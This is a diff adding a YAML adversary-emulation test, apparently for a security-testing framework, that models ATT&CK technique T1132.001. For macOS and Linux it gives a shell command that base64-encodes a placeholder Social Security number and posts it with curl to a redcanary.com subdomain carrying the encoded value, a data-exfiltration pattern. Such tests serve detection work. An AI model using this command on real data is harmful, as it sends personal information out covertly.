@@ -1,0 +1,21 @@
+---
+- id: d5c3d4d3a33600ba963db53932e355f7
+  name: Base64 Encoded data.
+  description: 'Utilizing a common technique for posting base64 encoded data.
+
+    '
+  tactic: command-and-control
+  technique:
+    attack_id: T1132.001
+    name: 'Data Encoding: Standard Encoding'
+  platforms:
+    darwin:
+      sh:
+        command: echo -n 111-11-1111 | base64; curl -XPOST MTExLTExLTExMTE=.redcanary.com
+        payloads: []
+        cleanup: ''
+    linux:
+      sh:
+        command: echo -n 111-11-1111 | base64; curl -XPOST MTExLTExLTExMTE=.redcanary.com
+        payloads: []
+        cleanup: ''
